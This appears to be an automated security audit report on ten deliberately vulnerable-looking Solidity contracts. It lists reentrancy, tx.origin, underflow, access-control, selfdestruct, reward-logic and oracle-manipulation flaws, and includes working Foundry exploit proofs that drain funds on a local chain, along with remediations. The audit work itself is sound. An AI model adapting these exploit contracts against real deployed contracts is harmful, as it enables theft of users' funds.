# Culpa audit — sleuth on `committed`

Model: `gemini-3.5-flash-lite` · 10 contract(s) · 7 finding(s), 6 proven with a landed exploit

## Summary

| Contract | Verdict | Findings |
|---|---|---|
| FlashFarm | vulnerable | logic-error (high, PROVEN) |
| GlassJaw | vulnerable | unprotected-selfdestruct (high, PROVEN) |
| HallOfMirrors | vulnerable | price-oracle-manipulation (high) |
| HollowVault | vulnerable | reentrancy (high, PROVEN) |
| Irongate | no findings | — |
| LatchGate | no findings | — |
| LooseLedger | vulnerable | arithmetic (high, PROVEN) |
| OpenTill | vulnerable | access-control (high, PROVEN) |
| OriginGate | vulnerable | tx-origin-auth (high, PROVEN) |
| TrueVault | no findings | — |

## FlashFarm — logic-error (🔴 high) · ✅ PROVEN

FlashFarm calculates rewards using instantaneous stake share rather than time-weighted balances, allowing an attacker to deposit massive capital in a single transaction to drain the entire reward pool. The attacker captures accumulated rewards meant for long-term stakers and immediately unstakes, causing a total loss of user funds.

**Proven on a local chain.** The exploit below runs green under `forge test`; attacker profit = `989010989010989010989`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {ExploitProof} from "@proof/ExploitProof.sol";
import {FlashFarm, Token} from "@contracts/FlashFarm.sol";

contract ProveFlashFarmLeadOne is ExploitProof {
    function test_exploit() external {
        Token stakeToken = new Token();
        Token rewardToken = new Token();
        FlashFarm farm = new FlashFarm(stakeToken, rewardToken);

        address alice = makeAddr("alice");
        stakeToken.mint(alice, 100 ether);
        rewardToken.mint(address(this), 1000 ether);

        rewardToken.approve(address(farm), 1000 ether);
        farm.fund(1000 ether);

        vm.startPrank(alice);
        stakeToken.approve(address(farm), 100 ether);
        farm.stake(100 ether);
        vm.stopPrank();

        address payable attacker = payable(makeAddr("attacker"));
        stakeToken.mint(attacker, 9000 ether);

        vm.startPrank(attacker);
        stakeToken.approve(address(farm), 9000 ether);
        farm.stake(9000 ether);
        farm.claim();
        farm.unstake(9000 ether);
        vm.stopPrank();

        profit = rewardToken.balanceOf(attacker);
        assertExploitLanded(900 ether);
    }
}
```

**Remediation.** Re-examine the invariant the function should preserve and add property tests around it.

---

## GlassJaw — unprotected-selfdestruct (🔴 high) · ✅ PROVEN

GlassJaw.demolish lacks access control, allowing any caller to directly execute selfdestruct and drain the contract's entire native token balance, including all user deposits, to the attacker's address.

**Proven on a local chain.** The exploit below runs green under `forge test`; attacker profit = `10000000000000000000`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {ExploitProof} from "@proof/ExploitProof.sol";
import {GlassJaw} from "@contracts/GlassJaw.sol";

contract ProveGlassJawLeadOne is ExploitProof {
    function test_exploit() external {
        GlassJaw g = new GlassJaw();
        address alice = makeAddr("alice");
        vm.deal(alice, 10 ether);
        vm.prank(alice);
        g.deposit{value: 10 ether}();

        address payable attacker = payable(makeAddr("attacker"));
        vm.prank(attacker);
        g.demolish(attacker);

        profit = attacker.balance;
        assertExploitLanded(5 ether);
    }
}
```

**Remediation.** Guard `selfdestruct` behind an owner check, or remove it.

---

## HallOfMirrors — price-oracle-manipulation (🔴 high) · unconfirmed

An attacker borrows cash via QuickLoan, uses it to swap for stake in MirrorPool to artificially inflate the spot price of stake, pledges a small amount of stake to PawnShop at the manipulated high price to draw a massive amount of cash, swaps back to normalize or leaves the pool, and repays the flash loan, extracting cash from PawnShop and leaving bad debt.

**Remediation.** Do not use an AMM spot price as an oracle. Use a TWAP, a dedicated price feed, or a manipulation-resistant source, and sanity-check against a second source.

---

## HollowVault — reentrancy (🔴 high) · ✅ PROVEN

HollowVault suffers from a classic reentrancy vulnerability because state updates (`balances[msg.sender] = 0`) occur after transferring ETH. An attacker exploits this by recursively calling `withdraw()` inside their fallback function to drain the vault's entire balance in a single transaction.

**Proven on a local chain.** The exploit below runs green under `forge test`; attacker profit = `10000000000000000000`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {ExploitProof} from "@proof/ExploitProof.sol";
import {HollowVault} from "@contracts/HollowVault.sol";

contract Raider {
    HollowVault v;
    constructor(HollowVault _v) payable { v = _v; }
    function go() external {
        v.deposit{value: 1 ether}();
        v.withdraw();
    }
    receive() external payable {
        if (address(v).balance >= 1 ether) {
            v.withdraw();
        }
    }
}

contract ProveHollowVaultLeadOne is ExploitProof {
    function test_exploit() external {
        HollowVault v = new HollowVault();
        address alice = makeAddr("alice");
        vm.deal(alice, 10 ether);
        vm.prank(alice);
        v.deposit{value: 10 ether}();

        Raider raider = new Raider{value: 1 ether}(v);
        raider.go();

        profit = address(raider).balance - 1 ether;
        assertExploitLanded(5 ether);
    }
}
```

**Remediation.** Apply checks-effects-interactions — update state before the external call — or wrap the function in a reentrancy guard.

---

## LooseLedger — arithmetic (🔴 high) · ✅ PROVEN

The contract performs point deductions inside an `unchecked` block, allowing an out-of-bounds `spend` call to underflow the caller's balance to a near-infinite value. The attacker exploits this massive balance to immediately drain the contract's ETH reserves.

**Proven on a local chain.** The exploit below runs green under `forge test`; attacker profit = `5000000000000000000`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {ExploitProof} from "@proof/ExploitProof.sol";
import {LooseLedger} from "@contracts/LooseLedger.sol";

contract ProveLooseLedgerLeadOne is ExploitProof {
    function test_exploit() external {
        LooseLedger ledger = new LooseLedger();
        address payable attacker = payable(makeAddr("attacker"));
        
        // Fund the ledger so it has ETH to drain
        vm.deal(address(ledger), 10 ether);

        // Attacker spends 5 ether without having any points, causing an underflow
        vm.prank(attacker);
        ledger.spend(5 ether);

        profit = attacker.balance;
        assertExploitLanded(1 ether);
    }
}
```

**Remediation.** Remove the `unchecked` block or add explicit bounds checks; on Solidity <0.8 use SafeMath.

---

## OpenTill — access-control (🔴 high) · ✅ PROVEN

The `OpenTill.drain()` function lacks access control modifiers, allowing any caller to invoke it directly. An attacker passes their own address as a parameter to immediately transfer the entire Ether balance of the contract in a single transaction, resulting in a total loss of funds.

**Proven on a local chain.** The exploit below runs green under `forge test`; attacker profit = `10000000000000000000`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {ExploitProof} from "@proof/ExploitProof.sol";
import {OpenTill} from "@contracts/OpenTill.sol";

contract ProveOpenTillOpenTillUnprotectedDrain is ExploitProof {
    function test_exploit() external {
        OpenTill till = new OpenTill();
        address alice = makeAddr("alice");
        vm.deal(alice, 10 ether);
        vm.prank(alice);
        till.deposit{value: 10 ether}();

        address payable attacker = payable(makeAddr("attacker"));
        vm.prank(attacker);
        till.drain(attacker);

        profit = attacker.balance;
        assertExploitLanded(5 ether);
    }
}
```

**Remediation.** Restrict the function to an authorized role. A function that moves funds must never be callable by an arbitrary address.

---

## OriginGate — tx-origin-auth (🔴 high) · ✅ PROVEN

Using `tx.origin` for authentication in `OriginGate.withdraw` allows attackers to drain contract funds by tricking the owner into calling a malicious intermediary contract. Because `tx.origin` evaluates to the transaction initiator rather than the immediate caller, the malicious contract successfully impersonates the owner and steals the entire balance.

**Proven on a local chain.** The exploit below runs green under `forge test`; attacker profit = `5000000000000000000`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {ExploitProof} from "@proof/ExploitProof.sol";
import {OriginGate} from "@contracts/OriginGate.sol";

contract Attacker {
    OriginGate gate;
    address payable target;

    constructor(OriginGate _gate, address payable _target) {
        gate = _gate;
        target = _target;
    }

    function attack() external {
        gate.withdraw(target, address(gate).balance);
    }

    receive() external payable {}
}

contract ProveOriginGateLeadOne is ExploitProof {
    function test_exploit() external {
        address owner = makeAddr("owner");
        address payable attacker = payable(makeAddr("attacker"));

        vm.deal(owner, 10 ether);
        
        OriginGate gate;
        vm.prank(owner);
        gate = new OriginGate{value: 5 ether}();

        Attacker atk = new Attacker(gate, attacker);

        // Owner is tricked into calling the malicious contract, which drains OriginGate via tx.origin
        vm.prank(owner, owner);
        atk.attack();

        profit = attacker.balance;
        assertExploitLanded(1 ether);
    }
}
```

**Remediation.** Authenticate with `msg.sender`, never `tx.origin` — `tx.origin` lets a phished user's call be relayed by an attacker contract.

---
